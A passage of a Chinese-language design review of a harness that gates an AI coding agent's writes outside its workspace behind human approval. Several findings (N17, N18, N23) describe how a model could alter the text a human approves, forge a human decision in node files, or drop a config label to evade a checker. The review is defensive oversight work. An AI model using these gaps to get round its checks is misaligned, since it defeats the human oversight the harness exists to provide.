2. D2 加背景段：「要知道新规则会不会误拦，得拿一批真实的工具调用来对照。你本机 DSH 的历史会话里有现成的调用记录（命令和路径），harness 可以只读这些记录、用今天的规则重新判一遍，当天就有样本；不读的话只能等新记录慢慢攒。读不读你的历史会话涉及你的隐私，所以问你。」标题改为「新规则会不会误拦，样本从哪来」；「实时影子记录」写成「新规则只记录不拦时攒下的记录」，「流水」写成「拦截记录」。
3. 申报卡：`detail` 第一段由 harness 写两三句背景，例「agent 在做「<焦点节点标题>」时要写工作区外的文件 <路径>，harness 先拦下了它。工作区外的文件能不能改只有你能定，批准只放行这一次。」焦点不在时省去节点那半句。第三次修复的待决：正文第一段同样写背景（「这个节点已经修过两次又被重新打开，第 3 次修复要开始了。同一处反复修不好，常常是问题没找对；要不要先停下查原因由你定。」），`停下查根因：<节点 id>` 这一行移到正文末尾（它是认法用的标签，§4.6 的认法改为按标签行而不是第一行）；「派发周期」改成「这个节点晚一轮才接着做」。
4. 两张卡的文字由 L2 钉住：不含 `验收`、`标定`、`门禁`、`投影`、`补遗`，`detail` 或正文的第一段是背景。

挡路依据：验收条件没有满足（简报要求遵守的人定事项）。

#### N14 NIT `RequestRecord` 的字段没有定义

位置：§2.2、§3.2、§5.3 回答表、§5.8。`GrantRecord`、`GrantVoidRecord`、`FollowupRecord` 都写了完整字段与 `kind`，`RequestRecord` 只出现 `{outcome, by, via, callId}` 等片段，没有 `kind: 'request'`、`at`、`ref`、`rule`。照片段实现时，带 `rule` 而没有 `kind`、`mode` 的一行会被 `classifyRecord` 算成拒绝。晨报的「排队 q」从哪种 `outcome` 来也没写（有待决时关掉卡片，工具返回 `queued`，流水写的是 `closed`）。改法：在 §3.2 写出 `RequestRecord {at, kind: 'request', ref, rule, outcome: 'approved' | 'declined' | 'text' | 'closed' | 'queued', by?: 'human', via: 'card' | 'panel', callId, node?, text?, error?, tool, agentId, sessionId, scope, route?}`，有待决时关掉卡片写 `queued`；§5.8 的「排队 q」数 `outcome: 'queued'`。

#### N15 NIT 「没有下一次」只在下一个 `turn/start` 结算

位置：§3.3 结果表 `none` 一行。拦截是会话最后一回合的最后一次调用时（子 agent 交回、人不再说话），永远等不到下一个 `turn/start`，这次拦截没有跟进记录，「拦截后下一步走对」的分母少算模型放弃的那些。rc.3 有 `turn/end`（agent-loop:1029 `this.session.append("turn/end", …)`）。改法：guard 行的 `session/event` 监听器在 `turn/end` 时结算这个会话里各 agent 的待判为 `none`，`session/disposed` 时同样结算；L2 加「拒绝之后回合结束、会话卸载，留下一条 `none`」。

#### N16 NIT 同一步里并行发出的调用结算了模型还没读到的拒绝

位置：§3.3。模型一步发出几个调用时，第一个被拒之后，同一步的第二个调用是在模型读到拒绝之前就发出的，却被当作「下一步」结算（`repeat` 或 `other`）。§6.3 的度量是「拦截后下一步」。改法：记录器记下拒绝所在的步（经 `agent/pre-step` 给每个 agent 记当前步号，或比较两次调用是否属于同一条助手消息），同一步的调用不结算；或在验收与晨报里写明量的是「下一次调用」。

#### N17 NIT 面板上批准时，人读到的路径与目的模型能改

位置：§5.5 第 2 个来源、§5.6。申报待决由 `harness` 提议，但标题与正文属于 `LLM_EDITABLE`（engine.ts:102，`planEdit` 对不是自己提议的节点只放行这几个字段）；`crux` 在路径超过 60 字时换成文件名。人关掉卡片之后在面板上批准时，看到的完整路径、目的与替代都在模型能改的正文里。放行仍绑定真实的签名与目标，覆盖前有备份，所以不是不可逆损失，但人批的未必是他读到的。改法：图上匹配另加一条「`propose` 之后没有 `actor: 'llm'` 的 `edit` 历史」，有就不放行，并以 `harness` 批注「作废：正文被改过」；或者把规范路径写进模型改不了的字段（例如 A 的 `cost` 一格写目录，`crux` 写文件名）。

#### N18 NIT §11 说工作区变更兜底会记下被改的节点文件，同一回合跑过图工具时不会

位置：§11 不可逆表「LLM 自己批准自己的申报」一行的「剩余」。`src/guard/shadow.ts` 的文件头写明：一个回合跑过图工具时，图目录下的改动算已知写入，同一回合里 shell 写进图目录的改动不记录。所以「用读法看不见的方式改节点文件、伪造一条 `human` 拍板」在跑过 `graph_show` 一类工具的回合里没有影子记录。这条路径没有新增能力（同样的 .NET 写法本来就能直接写工作区外，圈禁与 file-tools-only 都看不见），所以不挡路。改法：把那一句改为如实的说法：同一回合跑过图工具时兜底看不见；节点文件已跟踪，`git diff` 与面板上「你没拍过的拍板」是发现途径；这个缺口与 shell 直接写工作区外是同一个已知边界。

#### N19 NIT 申报卡的版面与 M3 附录 0.2 的决策卡不一致

位置：§5.4、§4.6。M3 附录 0.2 的决策卡选项说法是 `<key> · <label>`，不带任何推荐后缀，推荐写在结论行末尾「· agent 推荐 <key>」，`detail` 由 `src/design/cards.ts` 的 `choiceDetail` 构造（附录 :137–138、:315）；`design-context.md` 要求「keep the card display rules in one section so a change stays local」，`d-option-card` 正在与人重新商量。M4 的申报卡用 `B 不放行（推荐）` 后缀、自己拼 `detail`。人会看到两种写法，格式再改时要改三处。改法：申报卡与第三次修复的待决按 M3 的写法（`<key> · <label>`、不加后缀、结论行带推荐），卡面由 M3 定位置的那组函数构造（§2.3 已定 `src/graph/human-card.ts`，把 `choiceDetail`、`optionLabel` 一并放进去）；或者写明为什么不同。

#### N20 NIT 晨报的先后在 §13 前后矛盾

位置：§13 开工条件「G1–G3、E1–E4、R1、C1 不等 M3」；§13.3 晨报一行「M4 的三处改动排在 M3 第 9 步之后」。G1、G2、G4、E4 四步都改 `src/workflow/morning-report.ts`，G1 的「今天必败」就在晨报上。改法：晨报一行改为「先合入的先改，后到的在它之上重做」，与其他共用文件一致，并改成「四处」。

#### N21 NIT G1 的契约测试会因 §18 第 3 条提前提议的规范节点而失败

位置：§3.8 第三条契约测试「本仓库图上每个带 `规则：` 标签的规范节点，列出的规则都在目录里」；§18 第 3 条「在 G1 合入之前提议…七条规则的规范节点」。四条影子规则到 G3 才进目录，G1 合入时它们的规范节点已在图上，测试失败。改法：§18 第 3 条拆成两批，三条已有规则的节点在 G1 之前提，四条影子规则的节点在 G3 之前提；或者测试只核对「目录里的规则都有节点」与「节点里出现在目录中的规则模式一致」。

#### N22 NIT guard 线的文件清单漏了两个文件

位置：§13.2。G4 改 `src/graph/human-card.ts` 与 `tests/fake-rc3.ts`，guard 线一行只列 `src/guard/`、`scripts/guard/`、`tests/guard-*`、`tests/guard-corpus/`，共用文件清单里也没有这两个。M3 第 6 步同样碰它们。改法：guard 线加这两个文件，并在 §13.3 写明与 M3 第 6 步的先后（§13.3 `human-card.ts` 一行已有，补 `fake-rc3.ts`）。

#### N23 NIT `checker-config` 的额外路径来自模型能改的正文标签

位置：§4.1、§4.4、§7.1。额外的配置文件取自 env 工具节点正文的 `配置：` 标签；正文属于 `LLM_EDITABLE`，节点批准之后模型仍能删掉一条路径。影子期没有影响，转生效之后模型删掉标签就能不经申报改那个配置。改法：`配置：` 放进验收条件（批准之后只有人能改，与检查行同处），或只认最后一次由人批准时的正文。

#### N24 NIT 种子语料里的 4 条旧记录取不出调用

位置：§3.7「种子：…以及流水里现有的 4 条记录」。本仓库流水里的 4 条（2026-10-28 两条圈禁、2026-10-29 两条 file-tools-only）是 split 第 7 步之前或同期的格式，没有 `call` 字段，`corpus add <键>` 无从「从流水取出调用」。改法：这 4 条与 `docs/DEVELOPMENT.md` §7 的三次误判一起，按 `source: 'incident'` 手写进语料（参数从 `correction` 里的命令文本抄出），不经 `corpus add`。

#### N25 NIT 替别人申报之后，重调的一方要逐字重做同一组参数

位置：§5.3 `approved` 的 `message`；§5.5「子 agent」。签名绑定完整参数（含 `write` 的全部内容）。子 agent 已结束、由主 Agent 申报时，主 Agent 只拿到编号与目标路径，新派的子 agent 写不出逐字相同的内容，这次批准用不上。改法：`approved` 的结果里带上被拒那次调用的工具名与参数（harness 在拒绝表里有），`message` 写「pass these arguments verbatim to the agent that makes the call」；参数过长时写进 `<项目目录>/requests/<编号>.call.json` 并给路径。

#### N26 NIT 验收第 2 条「不论哪一行拦的」包含规则板，机制不覆盖

位置：§1.2 `m4-shadow` 建议验收第 2 条；§2.3 规则板一行；§18 第 5 条。只有 `installRuleGate` 调 `noteDenial`；规则板的监听器按 §2.3 只调 `observe`，规则板拦下的调用没有跟进记录。改法二选一：验收改为「经 `installRuleGate` 的每次拦截之后」；或 §2.3 与 §18 第 5 条给规则板加一句「拒绝时调 `noteDenial`（规则 id 为 `rules:<id>`，没有 `rightPath`）」。

### 已核实的假设（本轮新增）

- 引擎的身份与权限：`ACTORS = ['human', 'llm', 'harness']`（schema.ts:40）；`relay` 只允许 `llm` 写，带 `relay` 的历史条目 `actor` 仍为 `llm`（engine.ts:150–154、236–238）；`propose` 的历史条目带 `reason`（engine.ts:450）；`comment` 在核对 `rev` 之前就返回（engine.ts:473–475），所以「已用」「作废」批注不会遇到 `stale_revision`；`LLM_EDITABLE` 是 `title`、`body`、`slope`、`decider` 与派发字段（engine.ts:102）；`done` 只能到 `doing`，`llm` 重开不需要证据（`TRANSITIONS`、`planStatus`）；已完成的待决可以再拍，同一选项为 `bad_transition`；推荐必须在最后、人定的待决必须有 `crux`、`verdict`、`weight`（`questionRefusal`）；`CARD_LIMITS` 的数值与 §4.6 一致（schema.ts:55）。§4.6 与 §5.6 的示例文字都在上限之内。
- `tool` 是节点类型（schema.ts:8），`acceptance` 是通用字段；工具节点不在 `OPEN_PARENT_TYPES`，由 LLM 提议时为 `proposed`。
- M3 的 `decision_card` 以 `llm` 身份提议、`reason` 固定为「决策卡：在卡上问人」（M3 §3.5.1 第 3 步），不能用来造 `harness` 提议的申报待决。
- 客户端：`recommendedFirstOption` 只看 `options[0]`（client.js:683–686），初稿在 :783–795，`completed` 与 `submitDrafts` 在 :924–931：没有选项、没有文字、没有跳过时报 `error.incomplete`、不发出回答；跳过发出 `selected: []`。
- ESLint 10.13.0：cli.js:495–505 在有用不上的压制且没有 `passOnUnprunedSuppressions` 时 `return 2`；options.js:322 定义参数。
- `scripts/check-lint.mjs`:40 把 jscpd 报告写进 `.llm/checks`，:126 在 `finally` 里整个删掉，§6.3 改用 `env-checks/` 的理由成立。
- `src/toolsearch/index.ts`:155–175：包装不要求先检索；内层经 `agent.ctx.tools.execute`，`callId` 为 `<id>:deferred`，没有 `parent`。
- `toolCallArguments`、`toolCallOutcomes`、`installStepNotice`（`src/shared/step-notice.ts`）、`createUserNotice`（`src/shared/dsh-min.ts`:462）都在。
- `turn/start`（agent-loop:945）与 `turn/end`（agent-loop:1029）都是会话事件。
- 晨报今天以「没有 `mode`」判拒绝、`mode === 'shadow'` 判影子（morning-report.ts:38–39，与设计一致）。
- 本仓库流水 4 条，2 天，与 D2 的「2 天 4 条」一致。
- `.llm/docs/` 三个脚本的地址、链接模式与 9 个补充页路径与 §8 逐字一致。
- 规则板 0.4.1 的流水记录 `{at, rule: 'rules:<规则 id>', mode: 'enforce' | 'shadow', effect, …}` 没有 `kind`，`classifyRecord` 按 §3.2 分得对；它的监听器以 `prepend: true` 注册在最外层（规则板 0.4.1 第 392 行）。

### 没有核实或说法有误的假设（本轮）

- 有误：§3.3 把「下一次根调用」当作模型的下一步；GLM 上延迟工具的下一次根调用是 `DeferredToolCall` 包装，见 F9。
- 有误：§11「工作区变更兜底会记下被改的节点文件」；同一回合跑过图工具时不记，见 N18。
- 不一致：§13.3 晨报一行与 §13 开工条件，见 N20。
- 没有核实（设计已标推断并给了 L3 场景与预案）：各行导入 `dist/guard/followup.js` 拿到同一个模块实例。
- 没有复现：§3.6 与 D2 的本机实测数字、§6.1 的耗时；本评审没有读 `~/.dsh`。
- 依赖其他设计跟进：M3 附录 0.2 仍把卡片函数放在 `src/design/cards.ts`（附录 :137、:315、:429），没有采用 `src/graph/human-card.ts`；规则板 0.4.1 还没有 `observe`、`classifyRecord` 与导入 `src/guard/catalog.ts` 的说法（它的目录 id 写法是 `guard:workspace-containment`、`graph:files-only`，与 M4 的 `graph-files-only` 不同）。两件事都由 §13.3 的两种先后与 §18 第 5 条的批注处理，实现开工前要核对是否已记到图上。

## 第 3 轮（design.md 0.3）

核对范围：0.3 全文与它的 §19.2、`onepage.md`、`graph-ops-v03.json`；main `fe0bace`（设计依据 `8599304` 之后 75 个提交，其中 `src/guard/rules.ts` 与 `src/toolsearch/index.ts` 有改动，见 N34）；`src/guard/`、`src/graph/engine.ts`、`src/shared/step-notice.ts`、`src/shared/dialect.ts`、`src/toolsearch/index.ts`；`reference/dsh-desktop-0.2.1-rc.3/` 下 `dsh-api-session-controller`、`dsh-subagent`、`dsh-agent-loop`、`dsh-session`、`dsh-client-connection`、`dsh-schedule`、`dsh-goal-round-driver`（README 与 lib）、`dsh-tool-goal`、`dsh-client-file-upload`、`dsh-experimental-auto-review`，以及全部包里 `rpcId` 与 `source: { kind: "user" }` 的出处；`reference/zcode-3.17.1/zcode.cjs`；`.agents/tasks/design-context.md`（05:46 版，读到末节「Seam rulings between designs」）；图节点 `m4`、`m4-request-card`、`d-chat-not-cards`（全部历史）、`d-rules-visible`、`d-defaults-readonly`、`d-ui-look-not-operate`、`d-main-agent-shell`、`d-design-onepage`、`norm-review-floor`、`metrics`、`schedules`。兄弟设计（评审期间有三份在改，按读到时的版本）：规则板 0.8（06:04）、循环板 0.4（07:30，与 0.3 对照）、M3 附录 0.3（02:14）、M7 0.4（07:30）、plain-ui 0.6（07:30，与 0.5 对照）。

M3 附录的行号：编辑器与 `Select-String` 数出的行号不一致（文件里有非常规换行），下面只写节号与条目。

0.3 是完整的：§0–§19 都在，§19.2 两张表逐条对应第 2 轮的 15 条与评审之后的人定；`onepage.md` 与 `graph-ops-v03.json` 都在。

### 第 2 轮发现的状态

| 发现 | 状态 | 核对 |
| --- | --- | --- |
| F9 MEDIUM GLM 上延迟工具的包装调用替模型结算了跟进 | 关闭 | `observe` 先拆包，`<callId>` 与 `<callId>:deferred` 一起记为已结算，`noteDenial` 记内层（:376–380）；只结算有 `tool/call` 事件的调用（:374，agent-loop:580–582 先 `appendToolCall` 再 `prepare`，session:1579–1592 同步通知）；L2 两例（:404），`guard-request` 的 GLM 一遍核对 `right-path`（:1156）；验收第 2 条（:48）。ZCode 3.17.1 第 132 行的 `DeferredToolCall` schema 已实读 |
| F10 MEDIUM 给人的问题没有前因后果、用了换词表里的词 | 关闭 | D1 四行（:1246–1258），D2 只留记录（:1262–1264）；申报文字与第三次修复正文都经 `renderPlan`，背景紧跟题目（:592–606、:687–741）；「派发周期」改掉；认法改读 `propose` 的 `reason`（:587）；L2 钉换词与背景段（:1170）。第三次修复问法里新出现的二选一另见 F12 |
| N14 `RequestRecord` 的字段 | 关闭 | §3.2 :299–311 写全，带 `kind`；晨报的 q 数 `expired` 与 `closed`（:804） |
| N15 「没有下一次」只在 `turn/start` 结算 | 关闭 | `turn/end`、`session/disposed` 结算 `none`（:395，agent-loop:1029、session:1928–1933 实读）；L2（:406） |
| N16 同一步的并行调用 | 关闭 | 按 `tool/call` 的 `{turn, step}` 跳过同一步（:382）；L2（:405） |
| N17 面板批准时文字模型能改 | 关闭（不再适用） | 面板不批、申报不上图（§5、`d-ui-look-not-operate`） |
| N18 兜底看不见同一回合的节点文件改动 | 关闭 | §11 :1051 照实写 |
| N19 申报卡与 M3 决策卡版面不一致 | 关闭（不再适用） | 卡片取消；后继问题是 `renderPlan` 与 M3 的四行规则是两份，见 N27 |
| N20 晨报的先后 | 关闭 | §13.3 :1124 |
| N21 契约测试与规范节点的先后 | 关闭 | 分两批（:502、:1272） |
| N22 guard 线漏了文件 | 关闭 | `tests/fake-rc3.ts` 进共用表（:1125） |
| N23 `checker-config` 的路径在正文 | 关闭 | `config` 行进验收条件（:817、§4.1、§4.4、§7.1） |
| N24 旧记录取不出调用 | 关闭 | 七条种子手写为 `incident`（:494） |
| N25 替别人申报后要逐字重做参数 | 关闭 | 放行说明带工具与参数，超过 4 KiB 写 `requests/<编号>.call.json`（:763–769）。在 M7 下这条路仍走不通，见 F13 |
| N26 验收「不论哪一行」包含规则板 | 关闭 | 规则板与 git 快照门调 `observe`、`noteDenial`，没加之前验收只覆盖 `installRuleGate`（:384、:48） |

### 发现

#### F11 MEDIUM 改完文件就跑的检查器与第三次修复之前问人，都不在循环板上

位置：全文（0.3 没有一处提到循环板、`glmHournessLoops` 或 `d-rules-visible`）；§2.2、§2.3、§4.6、§6、§13.3、§18；`onepage.md`。

问题：`d-rules-visible`（人 2026-10-30「没问题，项目所有规则确实应该都在明面上」）定：到点或碰到某件事就去做的（改完文件就跑的检查器、晨报……）放在循环板，「规则板、循环板、M4、M7 与面板设计照此写」。`m4` 节点上有循环板 0.1、0.2 给 M4 的两条请求（2026-10-29T19:13Z、20:40Z）。循环板 0.4 已按 M4 0.3 写好它那一侧：§2.4 第 3–5 行（:244–246）、§5.3 第 15、16 项 `env.checks-after-edit` 与 `graph.third-rework`（:601–602）、§17「M4 0.3」三条（:1266–1269：env 行交一项，带 `ownRules` 与 `details`，声明 `env.files-edited`（`listedOnly`），每跑完一次检查调 `recordRun`；图行 R1 交 `graph.third-rework`，声明 `graph.third-reopen`，每提一次待决调 `recordRun`）。M4 0.3 没有接：env 行与图行都不调 `contribute`，循环板页上这两项不会出现，检查器写死的几个数（一步至多等 20 秒、每个检查 60 秒、连续失败 3 次、每种语言提醒一次）也不在任何一块板上。

改法：

1. §2.2 加两行。`src/env/loop-entry.ts`：env 行交给循环板的一份，条目 `env.checks-after-edit`，触发 `env.files-edited`，动作 `self`、`by: 'glm-hourness/env'`，`why`「改完文件马上知道有没有新问题」；`ownRules` 四行由 `CHECK_STEP_DEADLINE_MS`、`CHECK_COMMAND_MS`、连续失败上限、每种语言一次这四个常量生成，不另写数字；`details(entry, project)` 每个批过的检查行一行「<工具标题>：改了 <扩展名> 之后跑 · `<命令>`」，读 `envBranch`。`src/graph/loop-entry.ts`：条目 `graph.third-rework`，事件 `graph.third-reopen`（`listedOnly`），`self`、`by: 'glm-hourness/graph'`。
2. 交法照循环板 0.4 §3.1（:324–332、:404、:429）：各行在 `apply` 里 `ctx.inject([LOOPS_SERVICE], …)` 调 `contribute`，把 `dispose` 交给 `effect`；循环板不在时什么都不做。env 行每次送出检查结果（含后台送到的那次）调 `recordRun`，结局 `ran`（全 0）或 `reported`（有发现），`exits` 为各检查行的退出码；`reopenQuestion` 提议成功后调 `recordRun`。`contribute` 被拒或 `recordRun` 抛错时控制台告警一次、行健康写明，检查与提问照常。
3. §1.2 `m4-checks` 加第 5 条：「循环板在时，循环板页列出『改完文件就跑检查』一项，展开是每个批过的检查器一行与检查器自己的四条规矩，来源写项目编排带来的、只能看」；`m4-rules` 第 2 条加同样一句给第三次修复。L2 契约测试把两份交来的内容交给循环板的 `src/loops/model.ts` 校验（循环板未合入时这条测试跳过并写明原因）；L4 走查一次页面。
4. §13.3 加一行：循环板 S8 与 E3、R1，谁后合入谁加；§18 第 5 条加给 `schedules` 的批注。
5. 设计加一节按方向清单自查（`d-design-onepage`），逐条写 `d-rules-visible`、`d-defaults-readonly`、`d-chat-not-cards`、`d-ui-look-not-operate`、`d-one-main-agent`、`d-auto-drive`、`d-main-agent-models`、`d-main-agent-shell`、`d-peak-mode`、`metrics`、`norm-review-floor` 怎样遵守。`onepage.md`「你会看到什么」加一行：「循环板上多两项：改完代码就跑检查、同一件活要修第 3 次时先问你；规则板上多四条只记录的规则」。

挡路依据：违背人定的方向（`d-rules-visible`）。

#### F12 MEDIUM 第三次修复的问话让人在方案与「不做」之间二选一

位置：§4.6（:592–606 的正文、:610 的选项字段、:612 的 `notice`）；§13.3 :1132；§16「第三次修复怎样问」一行；§1.2 `m4-rules` 第 2 条。

问题：

- 正文最后一句「回「查」就先停下查原因，回「接着修」就照常往下做。」（:606）把「不做」一行（「直接接着修」）变成了一个可以回的选项；图上同时带 `options` A、B 与 `recommend`、`crux`、`verdict`，`notice` 让主 Agent 按「查 → B，接着修 → A」拍板。`d-chat-not-cards` 是人定的「连选项都没有的那种……你提几点和方案，我补充或者同意」（2026-10-29T17:01Z 的 relay）；编排方 17:08Z 的批注写明要守的三条：只拿一个方案、不编号不给字母、「不做」一行是交代理由、不是给人点的选项。人的「补充」（例「先查，但别超过半天」）在这种问法里没有地方落：主 Agent 只能拍 A 或 B。
- §4.6 与 §13.3 :1132 说去掉选项字段的引擎改动属于「改写 `d-option-card` 的那件事（还没有节点）」。人定的题不带选项，靠的是 M3 第 6 步的提议式待决（M3 附录 0.3 §3.3：`background`、`proposal`、`doubt`、`notTaken`、`conclusion`，`decide {conclusion}`）；附录 §3.5 的 `record_human_answer` 的 `question` 一种对任何提议式待决都能记，不问是谁提的。人已同意的落地方案第 2 条（17:08Z「没问题」）就是「项目图上要人定的事……存方案原文、人的原话与结论，不再要求 options……」。附录 §3.3「不改的」一条说引擎不禁止新写选项式的人定待决，那只是不拦，不是说新题照旧这样写。
- 「疑问」一行「前两次**是不是方向错了**，现在还拿不准」没有写出哪个事实一变方案就得换（17:08Z 第三条；design-context「Questions become conversation」对「疑问」的写法）。

改法：

1. 问话只问这一个方案：「先停下查原因，可以吗？」；正文里不出现两个回复词。
2. `reopenQuestion` 写提议式待决：`title`，`background`（例「这件活**修过两次又被重新打开**」），`proposal`、`doubt`、`notTaken` 照 M3 附录 §3.3 的行规则（每行恰好一处 2–12 码点的加粗；推荐、疑问、不做至多 40 码点；背景读 `PLAIN_LIMITS.background`）；正文只放「附」（三次重开的时刻与理由）；不带任何选项字段。`notice` 改为：「Filed question <id> for the human: this node is about to get its third fix. In your next reply show its four lines as they are, then record the answer with record_human_answer (kind question): agree → conclusion 先停下查原因; add or reject → their exact words, then put the changed plan with propose_to_human (question <id>).」R1 加依赖 M3 第 6 步，不做选项式的过渡；§13.3 :1132 那一行删去，改为「R1 依赖 M3 第 6 步」。
3. 疑问一行写成可核对的事实，例「若**前两次改的是同一处**，多半是方向错了」。
4. L2：`reopenQuestion` 的结果交给真实引擎提一次，节点上没有 `options`、`recommend`、`crux`、`verdict`、`weight`，四行过 `proposalLineRefusal`；正文与问话里没有两个以上的「回「…」」回复词。§16 那一行、§1.2 `m4-rules` 第 2 条随之改。

挡路依据：违背人定的方向（`d-chat-not-cards`，含人同意的落地方案第 2 条）。

#### F13 MEDIUM 有主 Agent 与 M7 的项目里，申报一条路也走不通

位置：§5.2（子 agent 的例外一句）；§5.5 放行之后的说明（:763–767）；§5.6「子 agent」「其他门禁照旧」（:784–785）；§2.3；§13.3；§13.4 第 4 项；§1.2 `m4-request-card` 第 1、7 条。

问题：申报从圈禁的拒绝开始，编号在 guard 行的 `rules()` 里生成（§5.2）。`d-one-main-agent` 的项目里写文件的只有子 agent，它们的写入先被外层的门拦下：

- M7 的 `execute:worker-scope` 以 `prepend` 注册（M7 0.4 :339）；worker 的目标「必须在本次派发的工作树根之内」（:341–347 第 2 条），工作区外的目标在这里就被拒绝，纠偏是 `ask_main` 与「widen the write scope」。派发链里不在登记表的 agent 由 `execute:dispatch-chain-readonly` 只读。外层拒绝时不调 `next()`（第 1 轮 F5 的前提），guard 行看不到这次调用，不生成编号，也不登记拒绝。主 Agent 自己没有写文件的工具，shell 写入归 file-tools-only（不可申报）与 M3 的 `main-agent-no-write`。
- 就算拿到编号、人回了「可以」，放行之后的说明叫主 Agent「dispatch a subagent and give it these arguments verbatim」（:765）。在 M7 下派出去的不是只写工作树的 worker，就是只读的非登记 agent，这次写入照样被拒。§5.6 :785「放行只让圈禁这一条不拦；M3、M7、规则板的规则照常判」说的就是这一点。

所以 M3 与 M7 都装上之后，`m4-request-card` 的「人批准只放行当次」一次也发生不了，工作区外的写入只能由人自己做；验收第 7 条「所有路由上都成立」与 §13.4 第 4 项在这个组合上不成立。失败是关着的（不会多写），但要求没有满足。

改法（建议的一条，也可以另选一条写定）：

1. 外层的写入门也发编号。`src/guard/request.ts` 导出 `outsideDenial(call, agent, origin): {ref, sentence} | undefined`：按 guard 行同一组圈禁根判断目标在不在工作区外，在外面就登记这次拒绝（同 §5.1 第 1 步），返回编号与给子 agent 的例外一句。M7 的 `worker-scope` 在目标出了工作树、又出了工作区时调它，把这句接在自己的纠偏后面。
2. 外层的写入门认放行。`GrantBook.peek(signature, root)` 只读、不消耗；`worker-scope` 在 `peek` 命中时放行这一次调用，核对与消耗仍在内层 guard 行的 §3.1 第 6、8 步；内层没有执行时不消耗（同 §5.6「一次」）。
3. 装了 M7 时，子 agent 的正路是等着而不是交回：例外一句写「Ask the main agent with ask_main: give ref "<ref>" and the target; when it answers that the human approved, make this identical call again.」。被拒的 worker 手里还有原参数，原样再调就能匹配，不必重派。放行之后给主 Agent 的说明在 M7 下写「answer the worker with answer_worker: the human approved; it makes the identical call once」；没有 M7 时保留今天的说法。
4. §2.3、§13.3 加一行（`worker-scope` 调 `outsideDenial` 与 `peek`，谁后合入谁加）；§18 第 5 条给 `m7` 的批注加这两件；§1.2 `m4-request-card` 加一条「装了 M7 的项目里，worker 写工作区外被拒之后，经主 Agent 申报、人回「可以」，worker 原样再调一次成功，第二次被拒」，层 L3（M7 合入之后的场景 `guard-request-worker`）与 L4 第 4 项。

挡路依据：要求没有满足（`m4-request-card`；`docs/ORCHESTRATION.md` §5 出工作区的同步卡）。

#### F14 MEDIUM 自动推进时，人的「可以」很难紧跟在申报文字后面

位置：§5.3 `ask` 的 `message`（「end your turn」）；§5.5 第 2、3 条；§1.2 `m4-request-card` 第 3 条；§14.1 `guard-request`；§13.4 第 4 项。

问题：§5.5 只在人的消息紧跟在「以申报文字结尾、没有工具调用」的助手消息之后时放行。`d-auto-drive` 下主 Agent 带着一个 goal 推进（M7 0.4 :46、§3.9.1 :813：放行之后 harness 建 goal）。DSH 的 `dsh-goal-round-driver` 在 agent 一空闲、goal 还在、轮次没用完时就排进下一轮（README「What each round does」；lib:144–164，`source: {kind: 'goal'}`，经 `followup`）。主 Agent 照说明结束回合之后，下一轮马上开始，又有带工具调用的助手消息。人读到申报文字再打字时，消息落进正在跑的这一轮（客户端以 `steer` 送进下一步，或以 `followup` 等这一轮结束，api-session-controller:949–950），前一条助手消息已经不是申报文字，记 `not-shown`。§5.5 第 2 条的「回合末再出示一次」每条申报只加一次，之后的轮次不再提醒。模型自己也不能马上把 goal 标成卡住（tool-goal:360：goal 轮里要连续若干轮之后才能标 `blocked`）；M7 的 `await_human` 只收图上的待决（§3.9.5 :803），申报不上图，M7 不会为它停住推进。结果是放行要靠人恰好在两轮之间打字〔推断：轮次之间的时机由 README 推出，没有运行〕。§5.6 让每个子 agent 的申报都经主 Agent，所以这就是有主 Agent 的项目里唯一的一条路；探针 `guard-request` 与 L4 第 4 项都没有活着的 goal，发现不了。

改法：

1. 申报开着时，自动推进停下等人。guard 行经服务导出 `openRequests(sessionId): readonly {ref, askedAt, target}[]`（已有的 guard 服务加一个成员，或新服务 `glmHournessRequests`，读取函数照 `AdapterContractCheck` 的做法）；M7 判「都在等人」时把主 Agent 会话里开着的申报算作等人的事（`goals.block`，原因码 `hourness-waiting-human`，消息写编号），申报关闭（`approved`、`declined`、`closed`、`expired`）时照「列出的都已拍板」恢复。§13.3 加一行，§18 第 5 条给 `m7` 加一条。
2. 「回合末再出示一次」改为每一轮都加：本会话有开着的申报、这一轮第一步没有人的消息、上一轮最后一条助手消息不以 `tail` 结尾时就加。
3. 没有 M7、人自己用 `/goal` 时，`ask` 的说明加一句「If a goal keeps you running, tell the human in this reply to answer when you stop; the request stays open until they do」；§11 加一行写明这种情形可能多次 `not-shown`，晨报计数。
4. L3：`guard-request` 加一遍「主 Agent 有活着的 goal、装着 goal-round-driver」：模拟人在申报文字出现之后回「可以」，放行成功；M7 合入之后另核对申报开着时 goal 为 `blocked`、关闭后恢复。

挡路依据：验收条件没有满足（`m4-request-card` 第 3 条在自动推进时做不到）。

#### F15 MEDIUM 等人回话的申报，面板「需要你」里看不到

位置：§5.8「为什么申报不上图」（:802）；§15（:1194）；§18 第 5 条 `m8-plain-language`。

问题：人同意的落地方案第 4 条（`d-chat-not-cards` 17:08Z「没问题」）：「面板只看不操作，『需要你』一节列出在等人回话的方案，点开跳到主 Agent 的对话」。申报文字就是一段在等人回话的方案。M4 把它留在内存与违规流水里，「要不要列由面板设计定」；plain-ui 0.6 的「需要你」只列图上的待决、`propose_to_human` 交出的确认与放行、等人批准的提议（§4.3 第 6 条 (a)(b)(c)，:96；会话现场投影只记 `propose_to_human` 与 `record_human_answer` 的参数，:371），读不到申报。两份设计合起来，这一类等人的事在面板上没有。F14 的情形里申报文字很快被后面的回复顶上去，面板是人还能看到它的地方。

改法：

1. 申报的开与关都写成会话日志里看得到的形状。开：`request_exception` 的结果（`outcome: 'ask'`、`ref`、`text`，已在日志里）。关：guard 行的步 notice 用 `createUserNotice` 的 facts 带 `request: {ref, outcome}`（`approved`、`declined`、`closed`、`expired`）。进程重启之后第一次给一个会话装 notice 时，日志里还开着、内存里没有的申报补一条 `outcome: 'lapsed'` 的 notice，并告诉 agent 这条申报作废了、要重调被拒的调用。
2. §18 第 5 条给 `m8-plain-language` 的批注改为请求：「需要你」(b) 一类加上 `request_exception` 的 `ask` 结果，列到同一 `ref` 的关闭 notice 或 2 小时为止；显示题目与背景、推荐两行，和「去这个对话回话 ›」（申报所在的会话，有主 Agent 时就是主 Agent 的会话）。§15 那一条删去。
3. L2：notice 的 facts 与重启后的 `lapsed`；L3 `guard-request` 核对会话日志里一开一关成对。

挡路依据：违背人同意的方向（`d-chat-not-cards` 落地方案第 4 条、`d-ui-look-not-operate`）。

#### F16 MEDIUM 回放读了工具结果的文字，人同意的只是命令与路径

位置：§3.6「读哪些事件、哪些字段」（:463）与「历史结果」一条；`onepage.md`「它自己会做的」第 3 行、「你之前定的」第 1 行；§16「回放读哪些字段」一行。

